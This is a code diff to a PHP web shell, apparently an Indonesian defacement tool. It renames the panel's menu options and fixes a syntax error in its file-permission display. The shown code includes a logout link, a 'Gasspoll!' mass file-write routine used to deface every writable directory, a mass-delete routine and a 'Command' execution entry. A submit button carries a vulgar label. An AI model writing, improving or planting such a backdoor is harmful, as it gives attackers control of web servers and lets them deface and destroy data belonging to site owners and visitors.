@@ -176,13 +176,13 @@ echo "<center>";
 echo "<center><table id='menu' width='990' border='0' cellpadding='0' cellspacing='0'><tr><td>";
 echo "<a class='destroy_table' href='?'>Home</a>";
 echo "<a class='destroy_table' href='?logout=true'>Logout</a>";
-echo "<a class='destroy_table' href='?dir=$dir&to=asokoe'>Gasspoll!</a>";
-echo "<a class='destroy_table' href='?dir=$dir&to=gassken'>Apus</a><br>";
+echo "<a class='destroy_table' href='?dir=$dir&to=mass'>Gasspoll!</a>";
+echo "<a class='destroy_table' href='?dir=$dir&to=masse'>Mass_delete</a><br>";
 echo "<a class='destroy_table' href='?dir=$dir&to=cmd'>Command</a>";
 echo "<a class='destroy_table' href='?dir=$dir&do=about'>About</a>";
 echo "</center>";
 
-if($_GET['to'] == 'asokoe') {
+if($_GET['to'] == 'mass') {
 	function sabun_massal($dir,$namafile,$isi_script) {
 		if(is_writable($dir)) {
 			$dira = scandir($dir);
@@ -250,7 +250,7 @@ if($_GET['to'] == 'asokoe') {
 	<input type='submit' name='start' value='ENTOT COK!' style='width: 450px;'>
 	</form></center>";
 	} 
-	} elseif($_GET['to'] == 'gassken') {
+	} elseif($_GET['to'] == 'masse') {
    function hapus_massal($dir,$namafile) {
 if(is_writable($dir)) {
    $dira = scandir($dir);
@@ -397,8 +397,7 @@ echo '<tr class="s_tb">
 if(is_writable($path.'/'.$dir)) echo '<font color="lime">';
 elseif(!is_readable($path.'/'.$dir)) echo '<font color="red">';
 echo perms($path.'/'.$dir);
-if(is_writable($path.'/'.$dir) || !is_readable($path.'/'.
-)) echo '</font>';
+if(is_writable($path.'/'.$dir) || !is_readable($path.'/'.$dir)) echo '</font>';
 
 echo '</center></td>
 <td class="pl"><center><form method="POST" action="?option&path='.$path.'">
